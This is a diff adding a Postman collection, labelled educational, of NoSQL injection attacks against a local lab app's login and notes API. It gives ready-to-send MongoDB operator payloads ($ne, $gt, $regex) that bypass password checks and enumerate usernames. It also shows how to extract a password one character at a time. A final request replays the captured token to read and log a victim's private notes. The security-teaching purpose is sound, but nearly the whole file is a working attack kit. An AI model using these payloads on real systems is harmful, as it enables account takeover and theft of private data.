@@ -1,0 +1,247 @@
+{
+	"info": {
+		"_postman_id": "nosql-injection-study",
+		"name": "NoSQL Injection Attacks",
+		"description": "Collection of NoSQL injection attack payloads for educational study.\n\n⚠️ For educational purposes ONLY.",
+		"schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json"
+	},
+	"variable": [
+		{
+			"key": "baseUrl",
+			"value": "http://localhost:3000"
+		},
+		{
+			"key": "stolenToken",
+			"value": ""
+		}
+	],
+	"item": [
+		{
+			"name": "0. Normal Login (for comparison)",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"if (pm.response.code === 200) {",
+							"    var data = pm.response.json();",
+							"    pm.collectionVariables.set('stolenToken', data.token);",
+							"    pm.test('Normal login successful', function() {",
+							"        pm.expect(data.username).to.equal('admin');",
+							"    });",
+							"}"
+						]
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [
+					{ "key": "Content-Type", "value": "application/json" }
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"username\": \"admin\",\n    \"password\": \"admin123\"\n}"
+				},
+				"url": {
+					"raw": "{{baseUrl}}/api/auth/login",
+					"host": ["{{baseUrl}}"],
+					"path": ["api", "auth", "login"]
+				}
+			}
+		},
+		{
+			"name": "Attack 1: Password Bypass ($ne)",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"if (pm.response.code === 200) {",
+							"    var data = pm.response.json();",
+							"    pm.collectionVariables.set('stolenToken', data.token);",
+							"    pm.test('Injection successful - logged in as: ' + data.username, function() {",
+							"        pm.expect(data.token).to.not.be.empty;",
+							"    });",
+							"}"
+						]
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [
+					{ "key": "Content-Type", "value": "application/json" }
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"username\": \"admin\",\n    \"password\": { \"$ne\": \"\" }\n}"
+				},
+				"url": {
+					"raw": "{{baseUrl}}/api/auth/login",
+					"host": ["{{baseUrl}}"],
+					"path": ["api", "auth", "login"]
+				},
+				"description": "Bypasses password check using $ne (not equal) operator.\nThe query becomes: find user where password != \"\" which matches any non-empty password."
+			}
+		},
+		{
+			"name": "Attack 2: Blind Login ($gt)",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"if (pm.response.code === 200) {",
+							"    var data = pm.response.json();",
+							"    pm.collectionVariables.set('stolenToken', data.token);",
+							"    pm.test('Blind injection successful - got user: ' + data.username, function() {",
+							"        pm.expect(data.token).to.not.be.empty;",
+							"    });",
+							"}"
+						]
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [
+					{ "key": "Content-Type", "value": "application/json" }
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"username\": { \"$gt\": \"\" },\n    \"password\": { \"$gt\": \"\" }\n}"
+				},
+				"url": {
+					"raw": "{{baseUrl}}/api/auth/login",
+					"host": ["{{baseUrl}}"],
+					"path": ["api", "auth", "login"]
+				},
+				"description": "Login without knowing ANY credentials.\n$gt: \"\" matches any string greater than empty string — returns the first user in the database."
+			}
+		},
+		{
+			"name": "Attack 3: User Enumeration ($regex ^s)",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"if (pm.response.code === 200) {",
+							"    var data = pm.response.json();",
+							"    pm.collectionVariables.set('stolenToken', data.token);",
+							"    pm.test('Found user starting with s: ' + data.username, function() {",
+							"        pm.expect(data.username.charAt(0)).to.equal('s');",
+							"    });",
+							"}"
+						]
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [
+					{ "key": "Content-Type", "value": "application/json" }
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"username\": { \"$regex\": \"^s\" },\n    \"password\": { \"$gt\": \"\" }\n}"
+				},
+				"url": {
+					"raw": "{{baseUrl}}/api/auth/login",
+					"host": ["{{baseUrl}}"],
+					"path": ["api", "auth", "login"]
+				},
+				"description": "Discovers usernames starting with 's' using $regex.\nChange ^s to ^a, ^b, ^t, etc. to enumerate all users."
+			}
+		},
+		{
+			"name": "Attack 4: Password Extraction ($regex ^a)",
+			"request": {
+				"method": "POST",
+				"header": [
+					{ "key": "Content-Type", "value": "application/json" }
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"username\": \"admin\",\n    \"password\": { \"$regex\": \"^a\" }\n}"
+				},
+				"url": {
+					"raw": "{{baseUrl}}/api/auth/login",
+					"host": ["{{baseUrl}}"],
+					"path": ["api", "auth", "login"]
+				},
+				"description": "Extract password character by character.\n\nStep 1: Try ^a → success (password starts with 'a')\nStep 2: Try ^ad → success\nStep 3: Try ^adm → success\n...\nKeep going until you get: ^admin123 → FULL PASSWORD EXTRACTED!"
+			}
+		},
+		{
+			"name": "Attack 5: Target student2 ($ne)",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"if (pm.response.code === 200) {",
+							"    var data = pm.response.json();",
+							"    pm.collectionVariables.set('stolenToken', data.token);",
+							"    pm.test('Targeted injection - logged in as: ' + data.username, function() {",
+							"        pm.expect(data.username).to.equal('student2');",
+							"    });",
+							"}"
+						]
+					}
+				}
+			],
+			"request": {
+				"method": "POST",
+				"header": [
+					{ "key": "Content-Type", "value": "application/json" }
+				],
+				"body": {
+					"mode": "raw",
+					"raw": "{\n    \"username\": \"student2\",\n    \"password\": { \"$ne\": \"wrongpassword\" }\n}"
+				},
+				"url": {
+					"raw": "{{baseUrl}}/api/auth/login",
+					"host": ["{{baseUrl}}"],
+					"path": ["api", "auth", "login"]
+				},
+				"description": "Login as student2 specifically.\n$ne: \"wrongpassword\" matches because the real password is never \"wrongpassword\"."
+			}
+		},
+		{
+			"name": "Attack 6: Steal User's Notes",
+			"event": [
+				{
+					"listen": "test",
+					"script": {
+						"exec": [
+							"if (pm.response.code === 200) {",
+							"    var data = pm.response.json();",
+							"    pm.test('Stolen ' + data.length + ' notes!', function() {",
+							"        pm.expect(data.length).to.be.greaterThan(0);",
+							"    });",
+							"    data.forEach(function(note) {",
+							"        console.log('STOLEN NOTE: ' + note.title + ' - ' + note.content);",
+							"    });",
+							"}"
+						]
+					}
+				}
+			],
+			"request": {
+				"method": "GET",
+				"header": [
+					{ "key": "Authorization", "value": "Bearer {{stolenToken}}" }
+				],
+				"url": {
+					"raw": "{{baseUrl}}/api/notes",
+					"host": ["{{baseUrl}}"],
+					"path": ["api", "notes"]
+				},
+				"description": "Uses the stolen token from any previous attack to access the victim's private notes.\n\nRun any Attack 1-5 first, then run this to see their notes."
+			}
+		}
+	]
+}
+
